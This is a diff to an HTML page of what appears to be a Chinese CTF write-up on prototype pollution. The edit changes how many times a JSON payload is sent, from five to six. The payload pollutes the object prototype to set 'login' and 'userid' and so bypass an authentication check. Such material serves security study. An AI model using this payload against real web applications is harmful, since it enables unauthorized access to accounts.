@@ -123,7 +123,7 @@
 
 <p>/路由中，如果我们通过了auth函数，就会直接到index的模板中，我们需要绕过这个auth函数，在函数中，开始的时候session是没有login和userid属性的，所以可以利用原型链污染来绕过这里。从而达到我们的利用目的。</p>
 <p>下面是实际操作的步骤</p>
-<p>先注册登录，重复发送5次payload，绕过auth函数。</p>
+<p>先注册登录，重复发送6次payload，绕过auth函数。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;type&quot;:&quot;test&quot;,&quot;content&quot;:&#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;login&quot;:true,&quot;userid&quot;:1&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225153310973.png" alt="image-20200225153310973"></p>
